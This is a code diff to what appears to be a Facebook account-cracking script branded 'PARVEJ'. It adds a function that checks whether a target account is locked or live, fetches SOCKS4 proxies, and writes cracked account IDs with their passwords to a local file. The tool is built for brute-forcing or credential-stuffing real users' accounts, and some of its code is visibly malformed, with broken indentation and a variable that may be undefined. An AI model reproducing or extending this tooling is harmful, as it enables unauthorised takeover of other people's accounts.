@@ -59,6 +59,16 @@ ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
+#-------checker------#
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
 try:
  prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox)
@@ -275,6 +285,14 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
+                try:
+                    uid=lo['uid']
+                except:
+                    uid=cid
+                    ckkx=lock_check(uid)
+                if ckkx=='LOCK':
+                    return
+                else:
                 print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
                 open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
@@ -284,17 +302,6 @@ def rcrack1(uid,pwx,tl):
         loop+=1
         sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
- #-------checker------#
-    def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-
     except:
         pass
 Main()
